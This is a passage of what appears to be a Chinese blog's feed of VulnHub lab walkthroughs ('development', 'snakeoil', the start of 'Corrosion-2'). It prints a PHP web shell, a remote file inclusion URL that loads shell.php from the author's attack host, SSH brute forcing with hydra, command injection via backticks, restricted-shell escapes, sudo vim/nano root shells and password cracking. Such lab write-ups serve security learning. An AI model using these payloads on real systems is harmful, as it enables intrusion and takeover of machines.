class="image.jpg"><br/><br/><br/><br/><p><strong>访问<code>sitemap.php</code>，给出两个<code>php</code>文件，<code>securitynotice.php</code>和<code>directortestpagev1.php</code></strong></p><img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/13.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>访问<code>securitynotice.php</code>，给出了设置密码的情况，可能以<code>P@ssw0rd</code>加数字为设置</strong></p><img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/14.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>访问<code>directortestpagev1.php</code>，给出一个<code>test.html</code>的界面</strong></p><img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/15.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>这个<code>test.html</code>与前面给出的是一样的，那么访问前面<code>test.pcap</code>这个文件，该文件直接下载到本地，然后使用科来或</strong></p><p><strong>者<code>wireshark</code>工具进行打开，即可看到产生的网络数据包</strong></p><br/><br/><br/><br/><p><strong>使用<code>wireshark</code>打开观察一下</strong></p><img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/16.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>ok，首先观察大概两个协议为主<code>http</code>和<code>smb</code>，那么先访问之前并未有的一个链接<code>/qinyi/motivation.html</code>，</strong></p><p><strong>啧，没有东西</strong></p><br/><br/><br/><br/><p><strong>继续分析<code>smb</code>协议的数据，但是并未发现敏感数据，只有一个路径<code>/DEVELOPMENT/IPC$</code>和版本等信息，但是不知</strong></p><p><strong>道用户名等</strong></p><img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/17.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>估计是实力不够，我是没从这个数据包发现到了东西</strong></p><br/><br/><br/><br/><p><strong>继续回到网站漏洞寻找吧</strong></p><br/><br/><br/><br/><p><strong>继续从网站下手，之前还有一个链接未点击测试</strong></p><p><a href="http://192.168.11.148:8080/developmentsecretpage/directortestpagev1.php?logout=1">http://192.168.11.148:8080/developmentsecretpage/directortestpagev1.php?logout=1</a></p><br/><br/><br/><br/><p>点击后，发现一个登录框，啧，这奇怪，访问时直接登录，这里难道出问题？</p><img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/18.jpg" class="image.jpg"><p><strong>直接就进去了，好像有点意思</strong></p><br/><br/><br/><br/><p><strong>虽然前面给出了密码的可能性策略，这里先随便在登录框输入，还是进去了，比刚刚多了一些报错</strong></p><img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/20.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>有一个<code>slogin_lib.inc.php</code>文件，实力不够，不懂啥用处，访问了也是个空白页</strong></p><img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/21.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>不管了，去先搜索一下，看是否是官方的函数，有没有什么用处</strong></p><br/><br/><br/><br/><p><strong>不搜不知道，一搜漏洞百出啊，我靠，直接在谷歌漏洞数据库找了两个exp</strong></p><img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/22.jpg" class="image.jpg"><br/><br/><br/><br/><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">第一个是远程文件包含<br><br>第二个是敏感文件的位置<br></code></pre></td></tr></table></figure><br/><br/><br/><p><br/><strong>那我们就一个一个试试个，先来看看第一个</strong></p><br/><br/><br/><br/><p><strong>漏洞利用：</strong></p><br/><br/><br/><br/><p><strong>第一个漏洞：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">因为是个远程文件包含，那我们创建一个php脚本测试，然后在kali开启一个http服务</span><br><br>&lt;?php if(isset($_REQUEST[&#x27;cmd&#x27;]))&#123; echo &quot;&lt;pre&gt;&quot;; $cmd = ($_REQUEST[&#x27;cmd&#x27;]); system($cmd); echo &quot;&lt;/pre&gt;&quot;; die; &#125;?&gt;<br></code></pre></td></tr></table></figure><br/><br/><br/><br/><p><strong>直接访问</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">http://192.168.11.148:8080/developmentsecretpage/slogin_lib.inc.php?slogin_path=http://192.168.11.128:8000/shell.php<br></code></pre></td></tr></table></figure><br/><br/><br/><br/><p><strong>执行后，kali这边的http服务并没有收到请求，所以，这个远程代码执行的漏洞，可能不存在也可能是被过滤了</strong></p><img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/23.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>再看看第二个漏洞吧：</strong></p><img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/24.jpg" class="image.jpg"><br/><ul><li><strong>好像有货，这么多账号密码，这密码一眼就是md5加密，过去解密一下</strong></li></ul><br/><br/><br/><br/><p><strong>这里使用网站解吧，比较快，能不能搞出来就看命了</strong></p><table><thead><tr><th align="center">admin</th><th align="center">未破解出来</th></tr></thead><tbody><tr><td align="center">intern</td><td align="center">12345678900987654321</td></tr><tr><td align="center">patrick</td><td align="center">P@ssw0rd25</td></tr><tr><td align="center">qiu</td><td align="center">qiu</td></tr></tbody></table><br/><br/><p><strong>那这边拿到三个账号密码，回去登录框登录肯定不对了，那都不用就进去了，那么测试ssh登录</strong></p><br/><br/><br/><br/><ul><li><strong>将三个用户名存储在<code>user</code>文件，三个密码存储在<code>passwd</code>文件，使用<code>hydra</code>进行爆破</strong></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">hydra -L user -P passwd ssh://192.168.11.148<br></code></pre></td></tr></table></figure><img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/25.jpg" class="image.jpg"><br/><br/><br/><br/><h2 id="后渗透："><a href="#后渗透：" class="headerlink" title="后渗透："></a>后渗透：</h2><br/><br/><ul><li><strong>连到了，但好像是有rbash</strong></li></ul><img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/26.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>看看有哪些可以用的吧</strong></p><img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/27.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>再看看是什么限制</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo $SHELL<br></code></pre></td></tr></table></figure><img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/28.jpg" class="image.jpg"><ul><li><strong>原来是lshell，那就先逃逸一波吧</strong></li></ul><br/><br/><br/><br/><p><strong>lshell逃逸：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">有<span class="hljs-built_in">echo</span>逃逸的测试，这里需要与python搭配</span><br><br>echo os.system(&#x27;/bin/bash&#x27;)<br></code></pre></td></tr></table></figure><br/><br/><br/><br/><p><strong>靶机内信息收集：</strong></p><br/><br/><p><strong>查看local.txt文件：</strong></p><img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/29.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>查看work.txt文件：</strong></p><img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/33.jpg" class="image.jpg"><ul><li><strong>这里提到了<code>patrick</code>，以及密码策略，应该还没有更改</strong></li></ul><br/><br/><br/><br/><p><strong>使用<code>find</code>寻找具有SUID权限的文件</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -perm -4000 -user root -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/34.jpg" class="image.jpg"><br/><br/><ul><li><strong>发现有<code>sudo</code>和<code>su</code></strong></li></ul><br/><br/><br/><br/><p><strong>那就再去看看sudo吧</strong></p><img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/35.jpg" class="image.jpg"><ul><li><strong>sudo -l 不可用，那没办法了</strong></li></ul><br/><br/><br/><br/><p><strong>查看&#x2F;etc&#x2F;passwd：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /etc/passwd | grep /bin/bash<br></code></pre></td></tr></table></figure><img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/36.jpg" class="image.jpg"><ul><li><strong>这里还有两个用户，admin和patrick，去它们的home目录看看</strong></li></ul><br/><br/><br/><br/><p><strong>在patrick的目录下，找到password.txt文件，以为有密码泄露，结果没有信息</strong></p><img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/37.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>提权：</strong></p><p><strong>突然想起来，一开始网站不是泄露了密码了吗？试试那里的密码能不能用，不能ssh不代表我不能su啊</strong></p><img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/38.jpg" class="image.jpg"><ul><li><strong>这里是看到它是有lxd的，至于能不能用lxd提权，还没有去试过，因为有更简单的方法</strong></li></ul><br/><br/><br/><br/><p><strong>sudo -l 查询</strong></p><img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/39.jpg" class="image.jpg"><ul><li><strong>能无需密码执行vim和nano</strong></li></ul><br/><br/><br/><br/><p><strong>什么？你告诉我不会用，不知道是干什么的，不会那不会查吗？</strong></p><p><strong>访问网站<code>https://gtfobins.github.io/</code>查看用法</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">vim</span><br>sudo vim -c &#x27;:!/bin/bash&#x27;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">nano</span><br>sudo nano<br>^R^X<br>reset; sh 1&gt;&amp;0 2&gt;&amp;0<br></code></pre></td></tr></table></figure><br/><br/><br/><br/><img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/40.jpg" class="image.jpg"><br/><br/><img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/41.jpg" class="image.jpg"><br/><br/><br/><br/><h2 id="总结"><a href="#总结" class="headerlink" title="总结:"></a><strong>总结:</strong></h2><p>该靶机有以下值得思考：</p><ul><li><p>对于网站，可能存在注释设计者忘记删除，往往会暴露敏感信息</p></li><li><p>对于网站的链接，功能等，都需要进行测试</p></li><li><p>对于网站的漏洞，不要只盯着CMS，一些语言函数也可能是有漏洞的</p></li><li><p>对于ssh无法登录时，不代表su无法切换，密码都是一样的，但是ssh可能做了限制</p></li><li><p>对于提权，这里采用sudo提权的方式</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>励志学习第三天之vulnhub-snakeoil</title>
    <link href="/2025/05/28/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9%E4%B9%8Bvulnhub-snakeoil/"/>
    <url>/2025/05/28/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9%E4%B9%8Bvulnhub-snakeoil/</url>
    
    <content type="html"><![CDATA[<h1 id="snakeoil"><a href="#snakeoil" class="headerlink" title="snakeoil"></a>snakeoil</h1><p><strong>靶机IP为192.168.11.144</strong></p><br/><br/><br/><br/><h2 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap -A -sV -p- 192.168.11.144<br></code></pre></td></tr></table></figure><img src="/2025/05/28/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9%E4%B9%8Bvulnhub-snakeoil/1.jpg" class="image.jpg"><br/><p><strong>开放22，80，8080端口，分别运行ssh，http，http服务</strong></p><ul><li>看到ssh，总会试着去爆破一下，万一出来了呢，但是没爆破出来</li></ul><br/><br/><br/><br/><h2 id="外围打点："><a href="#外围打点：" class="headerlink" title="外围打点："></a><strong>外围打点：</strong></h2><ul><li>访问80端口</li></ul><img src="/2025/05/28/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9%E4%B9%8Bvulnhub-snakeoil/2.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>好像没什么东西，就表示是被搭建完成了，扫一下目录看看</strong></p><img src="/2025/05/28/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9%E4%B9%8Bvulnhub-snakeoil/3.jpg" class="image.jpg"><p>啥都没有扫出来，指纹识别也没有什么东西</p><br/><br/><br/><br/><ul><li>访问8080端口</li></ul><img src="/2025/05/28/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9%E4%B9%8Bvulnhub-snakeoil/4.jpg" class="image.jpg"><br/><br/><br/><br/><ul><li>找到了个用户名patrick，再去ssh爆破看看，能不能出来，不过还是没有</li></ul><img src="/2025/05/28/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9%E4%B9%8Bvulnhub-snakeoil/5.jpg" class="image.jpg"><br/><br/><br/><br/><ul><li>再扫一下8080端口的目录</li></ul><img src="/2025/05/28/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9%E4%B9%8Bvulnhub-snakeoil/6.jpg" class="image.jpg"><p>还挺多，看到最后，应该就是login,registration,run,secret,users这几个有搞头</p><br/><br/><br/><br/><ul><li>访问&#x2F;users</li></ul><img src="/2025/05/28/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9%E4%B9%8Bvulnhub-snakeoil/7.jpg" class="image.jpg"><p><strong>发现了账号密码，不过给哈希加密了还有盐，应该很难爆破出来，不过还是要试试</strong></p><br/><br/><br/><br/><ul><li>&#x2F;login</li></ul><img src="/2025/05/28/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9%E4%B9%8Bvulnhub-snakeoil/8.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>这里说请求方式不允许，抓个包看了看允许的有options，post，那就开brup发包看看</strong></p><img src="/2025/05/28/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9%E4%B9%8Bvulnhub-snakeoil/9.jpg" class="image.jpg"><br/><br/><br/><br/><ul><li>&#x2F;registration</li></ul><img src="/2025/05/28/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9%E4%B9%8Bvulnhub-snakeoil/10.jpg" class="image.jpg"><br/><br/><br/><br/><ul><li>&#x2F;run</li></ul><img src="/2025/05/28/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9%E4%B9%8Bvulnhub-snakeoil/11.jpg" class="image.jpg"><br/><br/><br/><br/><ul><li>&#x2F;secret</li></ul><img src="/2025/05/28/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9%E4%B9%8Bvulnhub-snakeoil/12.jpg" class="image.jpg"><br/><br/><br/><br/><ul><li>有反应了，在这里猜测估计这个是登录，然后registration是注册，那我们先去看看registration</li></ul><img src="/2025/05/28/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9%E4%B9%8Bvulnhub-snakeoil/13.jpg" class="image.jpg"><br/><br/><br/><br/><ul><li>访问&#x2F;registrat，同样的东西</li></ul><img src="/2025/05/28/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9%E4%B9%8Bvulnhub-snakeoil/14.jpg" class="image.jpg"><br/><br/><br/><br/><ul><li>加上username&#x3D;admin，又跟我说password为空，那就继续加</li></ul><img src="/2025/05/28/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9%E4%B9%8Bvulnhub-snakeoil/15.jpg" class="image.jpg"><br/><br/><br/><br/><ul><li>返回了token，那估计就是有用的，我们先复制下来拿去登录</li></ul><img src="/2025/05/28/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9%E4%B9%8Bvulnhub-snakeoil/16.jpg" class="image.jpg"><br/><br/><br/><br/><ul><li>登录成功，但是没有重定向啊，就返回了个同样的token，干哈呢，不管了先去看看run（估计有东西）</li></ul><img src="/2025/05/28/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9%E4%B9%8Bvulnhub-snakeoil/17.jpg" class="image.jpg"><br/><br/><br/><br/><ul><li>这是啥意思，要请求url？？？，那就再试试</li></ul><img src="/2025/05/28/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9%E4%B9%8Bvulnhub-snakeoil/18.jpg" class="image.jpg"><br/><br/><br/><br/><ul><li>还是不行啊，想了很久，估计会不会是json格式传输，看看</li></ul><img src="/2025/05/28/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9%E4%B9%8Bvulnhub-snakeoil/19.jpg" class="image.jpg"><br/><br/><br/><br/><ul><li>还真的是json，注意修改类型为application&#x2F;json，但是这里又要secret key，不是还有个secret没看吗</li></ul><img src="/2025/05/28/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9%E4%B9%8Bvulnhub-snakeoil/20.jpg" class="image.jpg"><br/><br/><br/><br/><ul><li>服务器内部错误，为什么啊，带上刚刚的token看看，能不能进去</li></ul><img src="/2025/05/28/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9%E4%B9%8Bvulnhub-snakeoil/21.jpg" class="image.jpg"><br/><br/><br/><br/><ul><li>不应该啊，应该就是带上token就能看到secret了啊，奇怪，去搜了一下wp居然是要以access_token_cookie为变量</li></ul><img src="/2025/05/28/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9%E4%B9%8Bvulnhub-snakeoil/22.jpg" class="image.jpg"><br/><br/><br/><br/><ul><li>无语了，唉，算了既然出来了那就去run看看有什么吧</li></ul><img src="/2025/05/28/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9%E4%B9%8Bvulnhub-snakeoil/23.jpg" class="image.jpg"><br/><br/><br/><br/><ul><li>这是个啥</li></ul><img src="/2025/05/28/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9%E4%B9%8Bvulnhub-snakeoil/24.jpg" class="image.jpg"><br/><br/><br/><br/><img src="/2025/05/28/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9%E4%B9%8Bvulnhub-snakeoil/25.jpg" class="image.jpg"><br/><br/><br/><br/><ul><li><p>这里的<code>secret_key</code>是固定的，必须有才能有返回</p><p>但是<code>url</code>参数的值，并非固定的，尝试修改一下进行测试，只要在引号内修改，任意值的返回都是这个</p><p>并且，这里返回中，说不能解析主机<code>id</code>，采用的是<code>curl</code></p></li></ul><br/><br/><br/><br/><ul><li>发现直接在引号内输入<code>;id</code>是不行的，可能在某些符合内吧。想到可以使用反引号 &#96;&#96;&#96;&#96;这个可以执行的</li></ul><img src="/2025/05/28/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9%E4%B9%8Bvulnhub-snakeoil/26.jpg" class="image.jpg"><ul><li>出来了，那不就有命令执行了吗</li></ul><br/><br/><br/><br/><ul><li>开启个vshell，配置监听</li></ul><img src="/2025/05/28/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9%E4%B9%8Bvulnhub-snakeoil/27.jpg" class="image.jpg"><br/><br/><br/><br/><ul><li>直接把linux上线命令复制过去执行</li></ul><img src="/2025/05/28/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9%E4%B9%8Bvulnhub-snakeoil/28.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>成功上线</strong></p><br/><br/><br/><br/><h2 id="后渗透："><a href="#后渗透：" class="headerlink" title="后渗透："></a>后渗透：</h2><br/><br/><p><strong>打开交互式终端：</strong></p><img src="/2025/05/28/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9%E4%B9%8Bvulnhub-snakeoil/29.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>继续靶机内信息收集</strong></p><img src="/2025/05/28/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9%E4%B9%8Bvulnhub-snakeoil/30.jpg" class="image.jpg"><br/><br/><br/><br/><p>最后是发现sudo -l 是能用于提权的</p><ul><li><p>发现两个，一个以<code>root</code>执行无需密码的<code>shutdown</code>，一个是需要密码，所有都可以</p></li><li><p>但是这里不知道<code>patrick</code>的密码</p></li></ul><br/><br/><br/><br/><p><strong>接下来我们就去找找有没有配置文件，看看能不能拿下密码</strong></p><ul><li><p>查看由<code>python</code>搭建的<code>flask</code>网站配置，该配置文件就在<code>patrick</code>的家目录下，路径为</p><p><code>/home/patrick/flask_blog</code>，既然搭建在home目录下，那就必有妖孽搜</p></li><li><p>直接看主文件app.py</p></li></ul><img src="/2025/05/28/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9%E4%B9%8Bvulnhub-snakeoil/31.jpg" class="image.jpg"><p><strong>这里找到两串，估计其中一串就是密码，试试</strong></p><br/><br/><br/><br/><ul><li>最终以密码<code>NOreasonableDOUBTthisPASSWORDisGOOD</code>登录了<code>patrick</code>账户</li></ul><img src="/2025/05/28/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9%E4%B9%8Bvulnhub-snakeoil/32.jpg" class="image.jpg"><br/><br/><br/><br/><ul><li>那接下来不用说了，直接切换root用户不就行了吗</li></ul><img src="/2025/05/28/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9%E4%B9%8Bvulnhub-snakeoil/33.jpg" class="image.jpg"><br/><br/><br/><br/><p>通关</p><hr><br/><br/><br/><br/><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p><strong>该靶机有以下几点:</strong></p><ul><li><p>对于网站，最好就是在浏览时，借助抓包工具，这样可以分析很多，可以使用burp或yakit等</p></li><li><p>对于一些网站中的请求方式，请求方式不同，也会导致返回不同，这个是重点的，还有许多http的请求头不同，返回也会不同的</p></li><li><p>对于http协议中的一些东西，一定要了解，这里比如请求体数据格式，请求头cookie，content-type等等</p></li><li><p>python搭建的网站也是要了解的，这里的flask也是有很多漏洞的，具体可以百度搜索一下。</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>励志学习第二天之vulnhub-Corrosion-2</title>
    <link href="/2025/05/27/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-2/"/>
    <url>/2025/05/27/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-2/</url>
    
    <content type="html"><![CDATA[<h1 id="Corrosion-2"><a href="#Corrosion-2" class="headerlink" title="Corrosion-2"></a>Corrosion-2</h1><h2 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h2><br/><br/><p><strong>这次由于是tomcat的站点，访问后是个后台登录界面</strong></p><img src="/2025/05/27/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-2/1.jpg" class="image.jpg"><br/><br/><p><strong>查看内容需要登录，我们去找了一下msf的tomcat login的所有模块都没有打进去</strong></p><br/><br/><br/><br/><p><strong>信息收集，扫了目录，找到backup.zip，解压要密码，那直接丢到kali去爆破看看</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">生成 hash.txt</span><br>zip2john backup.zip &gt; hash.txt<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">然后使用 john 进行破解，同时指定一个强一点的字典(kali自带)</span><br>john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt<br></code></pre></td></tr></table></figure><ul><li>成功拿到密码@administrator_hi5</li></ul><br/><br/><br/><br/><p><strong>解压之后内容里面找到账号密码：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td 